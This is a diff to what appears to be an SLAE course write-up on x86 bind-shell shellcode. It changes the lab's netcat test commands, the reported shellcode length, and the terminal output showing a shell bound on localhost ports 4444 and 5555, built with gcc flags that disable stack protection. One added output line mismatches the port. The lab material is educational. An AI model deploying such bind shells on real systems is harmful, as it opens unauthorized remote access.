@@ -95,7 +95,8 @@ Seperate terminal demonstrating a successful bind connection and shell on the lo
 ```bash
 osboxes@osboxes:~$ netstat -antp | grep 4444
 tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      7041/shell_bind_tcp_poc
-osboxes@osboxes:~$ nc 127.0.0.1 4444
+osboxes@osboxes:~$ nc -nv 127.0.0.1 4444
+Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
 id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 ```
@@ -835,7 +836,7 @@ A simple C program scripted and edited with the newly generated shellcode:
 * Purpose: Bind shellcode on TCP port 5555, spawn a shell on incoming connection  
 * Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shell_bind_tcp_final  
 * Usage: ./shell_bind_tcp_final
-* Testing: nc 127.0.0.1 5555
+* Testing: nc -nv 127.0.0.1 5555
 * Shellcode size: 105 bytes
 * Architecture: x86
 **/
@@ -866,9 +867,8 @@ The C program is compiled as an executable binary and executed:
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shell_bind_tcp_final
 osboxes@osboxes:~/Downloads/SLAE$ ./shell_bind_tcp_final
-Shellcode length: 112
-$ id
-uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
+Shellcode length: 105
+
 ```
 
 Seperate terminal demonstrating a successful bind connection and shell on the local host via port 5555:
@@ -876,8 +876,9 @@ Seperate terminal demonstrating a successful bind connection and shell on the lo
 ```bash
 osboxes@osboxes:~$ netstat -antp | grep 5555
 tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      1884/shell_bind_tcp_final
-osboxes@osboxes:~$ nc 127.0.0.1 5555
-$ id
+osboxes@osboxes:~$ nc -nv 127.0.0.1 5555
+Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
+id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 ```
 
